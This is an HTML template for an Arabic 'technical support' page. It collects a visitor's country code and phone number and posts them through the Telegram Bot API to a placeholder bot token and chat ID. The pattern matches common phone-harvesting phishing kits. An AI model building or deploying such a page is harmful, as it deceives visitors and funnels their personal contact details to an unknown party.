<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Support</title>

<style>
body {
    background: #0d0d0d;
    font-family: Arial;
    color: white;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.box {
    background: #1a1a1a;
    padding: 25px;
    border-radius: 15px;
    width: 320px;
    text-align: center;
    box-shadow: 0 0 25px #00ffcc33;
}

h2 {
    margin-bottom: 15px;
}

select, input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 10px;
    border: none;
    background: #333;
    color: white;
}

button {
    width: 100%;
    padding: 14px;
    border-radius: 12px;
    border: none;
    background: #00ffcc;
    color: black;
    font-weight: bold;
    font-size: 16px;
    cursor: pointer;
}
</style>
</head>

<body>

<div class="box">
    <h2>الدعم الفني</h2>

    <select id="country">
        <option value="">اختر الدولة</option>
        <option value="+20">🇪🇬 مصر</option>
        <option value="+966">🇸🇦 السعودية</option>
        <option value="+971">🇦🇪 الإمارات</option>
        <option value="+1">🇺🇸 أمريكا</option>
        <option value="+44">🇬🇧 بريطانيا</option>
        <option value="+33">🇫🇷 فرنسا</option>
        <option value="+49">🇩🇪 ألمانيا</option>
        <option value="+90">🇹🇷 تركيا</option>
        <option value="+91">🇮🇳 الهند</option>
        <option value="+92">🇵🇰 باكستان</option>
        <option value="+62">🇮🇩 اندونيسيا</option>
        <option value="+55">🇧🇷 البرازيل</option>
        <option value="+7">🇷🇺 روسيا</option>
        <option value="+34">🇪🇸 اسبانيا</option>
        <option value="+39">🇮🇹 ايطاليا</option>
        <option value="+81">🇯🇵 اليابان</option>
        <option value="+82">🇰🇷 كوريا</option>
        <option value="+27">🇿🇦 جنوب أفريقيا</option>
        <option value="+234">🇳🇬 نيجيريا</option>
        <option value="+212">🇲🇦 المغرب</option>
    </select>

    <input type="text" id="phone" placeholder="ادخل رقمك بدون كود الدولة">

    <button onclick="send()">✈️ إرسال</button>
</div>

<script>
function send(){
    let country = document.getElementById("country").value;
    let phone = document.getElementById("phone").value;

    if(country === ""){
        alert("اختار الدولة الأول ❗");
        return;
    }

    if(phone.length < 6){
        alert("رقم غير صحيح ❗");
        return;
    }

    let full = country + phone;

    // هنا تقدر تبعت الرقم للبوت
    fetch("https://api.telegram.org/botYOUR_TOKEN/sendMessage", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: "YOUR_ID",
            text: "📞 رقم جديد:\n" + full
        })
    });

    alert("تم الإرسال ✅");
}
</script>

</body>
</html>
